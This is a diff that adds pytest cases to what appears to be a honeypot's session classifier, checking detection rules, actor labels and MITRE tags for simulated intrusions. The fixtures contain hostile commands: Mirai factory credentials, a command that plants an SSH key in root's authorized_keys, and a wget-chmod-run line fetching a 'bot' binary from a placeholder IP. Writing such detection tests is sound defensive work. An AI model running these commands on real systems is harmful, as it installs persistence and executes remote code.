@@ -133,6 +133,41 @@ def test_non_mirai_credential_pair_does_not_match_iot_rule():
     assert "telnet_automated_credential_burst" in summary.matched_rule_ids
 
 
+def test_mirai_default_pair_is_a_commodity_bot_tagged_default_accounts():
+    """A device-specific factory password names the actor on its own, even
+    when the generic brute_force_bot rules match the same session."""
+    session = make_session(
+        "telnet",
+        [("login: root", 0.0), ("password: xc3511", 0.05)],
+        duration_seconds=0.05,
+        persona_id="busybox_router",
+    )
+
+    summary = classify_session(session, connection_count_from_same_ip=9)
+
+    assert "mirai_iot_credential_burst" in summary.matched_rule_ids
+    assert summary.actor_label == "commodity_bot"
+    assert "T1078.001" in summary.mitre_tags
+    assert summary.intent == "credential_theft"
+
+
+def test_generic_default_pair_is_brute_force_not_mirai():
+    """admin:admin is in every wordlist, so it says nothing about which bot
+    sent it -- it stays with the brute-force rules and their fix."""
+    session = make_session(
+        "telnet",
+        [("login: admin", 0.0), ("password: admin", 0.05)],
+        duration_seconds=0.05,
+        persona_id="busybox_router",
+    )
+
+    summary = classify_session(session)
+
+    assert "mirai_iot_credential_burst" not in summary.matched_rule_ids
+    assert summary.actor_label == "brute_force_bot"
+    assert "T1078.001" not in summary.mitre_tags
+
+
 def test_http_sensitive_path_probe_matches_env_request():
     session = make_session(
         "http",
@@ -315,3 +350,62 @@ def test_fetch_and_run_text_over_http_does_not_match_the_ssh_rule():
     summary = classify_session(session)
 
     assert "ssh_remote_payload_fetch_and_run" not in summary.matched_rule_ids
+
+
+def test_ssh_authorized_key_install_is_high_risk_commodity_bot():
+    """Leaving a login key behind must not be rated the same as a password
+    guess, and the generic brute_force_bot rules must not decide its label
+    even when the address has reconnected often."""
+    session = make_session(
+        "tcp_shell",
+        [
+            ("login: root", 0.0),
+            ("password: admin", 0.0),
+            (
+                "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E example-key' >> /root/.ssh/authorized_keys "
+                "&& chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 2>/dev/null",
+                2.0,
+            ),
+        ],
+        duration_seconds=2.5,
+    )
+
+    summary = classify_session(session, connection_count_from_same_ip=9)
+
+    assert "ssh_authorized_key_install" in summary.matched_rule_ids
+    assert "repeat_connections_same_ip" in summary.matched_rule_ids
+    assert summary.actor_label == "commodity_bot"
+    assert "T1098.004" in summary.mitre_tags
+    assert summary.behavior_stage == "persistence"
+    assert summary.intent == "persistence"
+    assert summary.risk_level == "high"
+
+
+def test_reading_authorized_keys_does_not_match_the_key_install_rule():
+    session = make_session(
+        "tcp_shell",
+        [("login: root", 0.0), ("password: admin", 0.0), ("cat ~/.ssh/authorized_keys", 1.0)],
+        duration_seconds=1.5,
+    )
+
+    summary = classify_session(session)
+
+    assert "ssh_authorized_key_install" not in summary.matched_rule_ids
+
+
+def test_fetch_and_run_session_reports_payload_delivery_with_repeat_connections():
+    session = make_session(
+        "tcp_shell",
+        [
+            ("login: root", 0.0),
+            ("password: admin", 0.0),
+            ("cd /tmp; wget -q http://203.0.113.9/bot; chmod +x bot; ./bot", 2.0),
+        ],
+        duration_seconds=2.5,
+    )
+
+    summary = classify_session(session, connection_count_from_same_ip=9)
+
+    assert summary.actor_label == "commodity_bot"
+    assert summary.intent == "payload_delivery"
+    assert summary.risk_level == "high"
